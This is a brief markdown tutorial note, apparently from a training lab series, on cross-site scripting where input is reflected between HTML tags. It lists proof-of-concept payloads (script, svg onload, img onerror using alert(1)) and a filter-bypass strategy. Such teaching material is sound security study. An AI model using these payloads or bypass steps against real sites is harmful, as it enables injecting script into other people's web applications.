# XSS Between HTML Tags

## Overview

HTML Context XSS occurs when user-controlled input is reflected between HTML tags.

Example:

```html
<p>USER_INPUT</p>
```

---

# Why It Is Dangerous

The browser interprets:

```html
<script>
```

and other HTML elements as code.

If filtering is weak, attackers can inject executable markup.

---

# Example

Application Response:

```html
<p>Hello USER_INPUT</p>
```

---

Attacker Input:

```html
<script>alert(1)</script>
```

---

Result:

```html
<p>Hello
<script>alert(1)</script>
</p>
```

---

# Common Payloads

## Script Tag

```html
<script>alert(1)</script>
```

---

## SVG

```html
<svg onload=alert(1)>
```

---

## Image

```html
<img src=1 onerror=alert(1)>
```

---

# Common Restrictions

Applications may block:

```html
<script>
```

but allow:

```html
svg
img
custom tags
```

---

# Filter Bypass Strategy

```text
Identify Allowed Tags
        ↓
Identify Allowed Events
        ↓
Build Payload
        ↓
Verify Execution
```

---

# Related Labs

- Lab11
- Lab12
- Lab13
- Lab14

---

# Key Takeaways

- HTML Context is often the easiest XSS context.
- Filters rarely block every tag and event.
- SVG-based payloads are common bypasses.